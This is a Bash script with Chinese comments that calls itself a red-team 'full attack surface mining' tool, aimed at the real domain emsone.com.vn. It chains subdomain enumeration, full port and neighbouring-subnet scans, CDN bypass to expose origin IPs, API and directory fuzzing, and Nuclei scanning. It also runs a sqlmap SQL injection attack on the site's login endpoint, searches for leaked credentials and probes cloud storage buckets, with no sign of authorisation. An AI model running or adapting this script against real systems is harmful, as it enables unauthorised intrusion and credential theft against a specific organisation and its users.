#!/bin/bash
# emsone.com.vn 全攻击面挖掘脚本
# 红队专家级 - 深度挖掘一切攻击面

TARGET="emsone.com.vn"
OUT_DIR="recon_${TARGET}"
mkdir -p $OUT_DIR

echo "[+] 开始深度挖掘 $TARGET 所有攻击面..."

# ===== 阶段1: 资产发现 =====
echo "[1/10] 子域名枚举（全方位）"
subfinder -d $TARGET -all -recursive -o $OUT_DIR/subs.txt 2>/dev/null
amass enum -d $TARGET -active -brute -o $OUT_DIR/amass.txt 2>/dev/null
chaos -d $TARGET -o $OUT_DIR/chaos.txt 2>/dev/null
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u >> $OUT_DIR/crt.txt 2>/dev/null
cat $OUT_DIR/subs.txt $OUT_DIR/amass.txt $OUT_DIR/chaos.txt $OUT_DIR/crt.txt 2>/dev/null | sort -u > $OUT_DIR/all_subs.txt
echo "[+] 发现 $(wc -l < $OUT_DIR/all_subs.txt) 个子域名"

# ===== 阶段2: 存活验证 =====
echo "[2/10] 存活验证（多线程）"
httpx -l $OUT_DIR/all_subs.txt -mc 200,301,302,403,401 -t 200 -o $OUT_DIR/alive.txt -tech-detect -title -status-code -cdn 2>/dev/null
echo "[+] 存活: $(wc -l < $OUT_DIR/alive.txt)"

# ===== 阶段3: 端口扫描 =====
echo "[3/10] 端口扫描（全端口）"
cat $OUT_DIR/alive.txt | cut -d/ -f3 | sort -u > $OUT_DIR/hosts.txt
naabu -l $OUT_DIR/hosts.txt -p - -c 100 -rate 5000 -o $OUT_DIR/ports.txt 2>/dev/null
echo "[+] 开放端口: $(wc -l < $OUT_DIR/ports.txt)"

# ===== 阶段4: 技术栈识别 =====
echo "[4/10] 技术栈识别"
whatweb -i $OUT_DIR/alive.txt --no-errors -a 3 -v 2>/dev/null | tee $OUT_DIR/tech_stack.txt
wappalyzer -u $TARGET -o $OUT_DIR/wappalyzer.json 2>/dev/null

# ===== 阶段5: CDN绕过 - 真实IP挖掘 =====
echo "[5/10] CDN绕过 - 真实IP挖掘"
# 方法1: 历史DNS
curl -s "https://viewdns.info/iphistory/?domain=$TARGET" | grep -oP '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > $OUT_DIR/ip_history.txt
# 方法2: 子域名IP关联
for sub in $(head -20 $OUT_DIR/all_subs.txt); do
    host $sub 2>/dev/null | grep "has address" | awk '{print $4}' >> $OUT_DIR/sub_ips.txt
done
sort -u $OUT_DIR/sub_ips.txt > $OUT_DIR/unique_ips.txt
# 方法3: 邮件服务器
dig $TARGET MX +short 2>/dev/null | while read mx; do
    host $(echo $mx | awk '{print $2}') 2>/dev/null | grep "has address" | awk '{print $4}'
done >> $OUT_DIR/mx_ips.txt
# 方法4: SSL证书IP
curl -s "https://crt.sh/?q=%25$TARGET&output=json" | jq -r '.[] | .id' | head -10 | while read id; do
    curl -s "https://crt.sh/?id=$id" 2>/dev/null | grep -oP '(?<=IP Address: )[0-9.]+'
done | sort -u >> $OUT_DIR/cert_ips.txt
echo "[+] 发现IP: $(cat $OUT_DIR/ip_history.txt $OUT_DIR/unique_ips.txt $OUT_DIR/mx_ips.txt $OUT_DIR/cert_ips.txt 2>/dev/null | sort -u | wc -l)"

# ===== 阶段6: C段扫描 =====
echo "[6/10] C段扫描"
cat $OUT_DIR/unique_ips.txt 2>/dev/null | while read ip; do
    C_SEG=$(echo $ip | cut -d. -f1-3)
    echo "$C_SEG.0/24"
done | sort -u > $OUT_DIR/c_segments.txt
masscan -iL $OUT_DIR/c_segments.txt -p80,443,8080,8443,3389,445,3306,5432,6379,27017 --rate=1000 -oJ $OUT_DIR/c_scan.json 2>/dev/null

# ===== 阶段7: API端点发现 =====
echo "[7/10] API端点深度发现"
# JS文件提取API
cat $OUT_DIR/alive.txt | while read url; do
    curl -s "$url" 2>/dev/null | grep -oP 'src="[^"]*\.js"' | sed 's/src="//;s/"//' | while read js; do
        curl -s "$js" 2>/dev/null | grep -oP 'https?://[^"\' ]+/api/[^"\' ]+' | sort -u >> $OUT_DIR/api_endpoints.txt
        curl -s "$js" 2>/dev/null | grep -oP '/api/[a-zA-Z0-9/_]+' | sort -u >> $OUT_DIR/api_paths.txt
    done
done
# GraphQL端点
for path in graphql graphiql v1/graphql api/graphql; do
    curl -X POST "https://$TARGET/$path" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}' 2>/dev/null | grep -q "__schema" && echo "https://$TARGET/$path" >> $OUT_DIR/graphql_endpoints.txt
done
# Swagger/OpenAPI
for path in swagger swagger.json api-docs openapi.json; do
    curl -s "https://$TARGET/$path" 2>/dev/null | grep -q "swagger\|openapi" && echo "https://$TARGET/$path" >> $OUT_DIR/swagger_endpoints.txt
done
echo "[+] API端点: $(wc -l < $OUT_DIR/api_endpoints.txt 2>/dev/null || echo 0)"

# ===== 阶段8: 目录扫描 =====
echo "[8/10] 目录扫描（敏感路径）"
cat $OUT_DIR/alive.txt | while read url; do
    ffuf -u "$url/FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 50 -o $OUT_DIR/ffuf_$(echo $url | sed 's|https\?://||;s|/|_|g').json 2>/dev/null
done

# ===== 阶段9: 漏洞扫描 =====
echo "[9/10] 漏洞扫描（Nuclei）"
nuclei -l $OUT_DIR/alive.txt -t ~/nuclei-templates/ -severity critical,high -o $OUT_DIR/nuclei.txt -rate 100 2>/dev/null
# SQL注入测试
sqlmap -u "https://$TARGET/Account/JLogin" --data "MobileNumber=test&Password=test" --batch --crawl=2 --level=3 --risk=2 -o $OUT_DIR/sqlmap.txt 2>/dev/null

# ===== 阶段10: 凭证泄露挖掘 =====
echo "[10/10] 凭证泄露挖掘"
# GitHub代码泄露
echo "site:github.com \"$TARGET\" password" > $OUT_DIR/github_dorks.txt
echo "site:github.com \"$TARGET\" api_key" >> $OUT_DIR/github_dorks.txt
echo "site:github.com \"$TARGET\" secret" >> $OUT_DIR/github_dorks.txt
echo "site:github.com \"$TARGET\" token" >> $OUT_DIR/github_dorks.txt
echo "site:github.com \"$TARGET\" .env" >> $OUT_DIR/github_dorks.txt
echo "site:github.com \"$TARGET\" aws_access_key" >> $OUT_DIR/github_dorks.txt
# Pastebin泄露
curl -s "https://pastebin.com/raw/search?q=$TARGET" 2>/dev/null | grep -i "$TARGET" > $OUT_DIR/pastebin_leaks.txt

# ===== 云存储桶枚举 =====
echo "[+] 云存储桶枚举"
for bucket in emsone emsone-vietnam emsvietnam emsone-backup emsone-logs; do
    aws s3 ls s3://$bucket --no-sign-request 2>/dev/null && echo "s3://$bucket" >> $OUT_DIR/s3_buckets.txt
done

# ===== 测试环境发现 =====
echo "[+] 测试环境发现"
for env in dev test staging uat pre prod demo sandbox; do
    for prefix in "" "api-" "-api" "app-"; do
        echo "$prefix$env.$TARGET" >> $OUT_DIR/test_envs.txt
        echo "$env-$prefix.$TARGET" >> $OUT_DIR/test_envs.txt
    done
done
httpx -l $OUT_DIR/test_envs.txt -mc 200,403 -o $OUT_DIR/test_envs_alive.txt 2>/dev/null

# ===== 总结报告 =====
echo ""
echo "=========================================="
echo "[+] 攻击面挖掘完成"
echo "=========================================="
echo "子域名: $(wc -l < $OUT_DIR/all_subs.txt)"
echo "存活: $(wc -l < $OUT_DIR/alive.txt)"
echo "端口: $(wc -l < $OUT_DIR/ports.txt)"
echo "API端点: $(wc -l < $OUT_DIR/api_endpoints.txt 2>/dev/null || echo 0)"
echo "漏洞: $(wc -l < $OUT_DIR/nuclei.txt 2>/dev/null || echo 0)"
echo "测试环境: $(wc -l < $OUT_DIR/test_envs_alive.txt 2>/dev/null || echo 0)"
echo "=========================================="
echo "[+] 结果保存在: $OUT_DIR/"
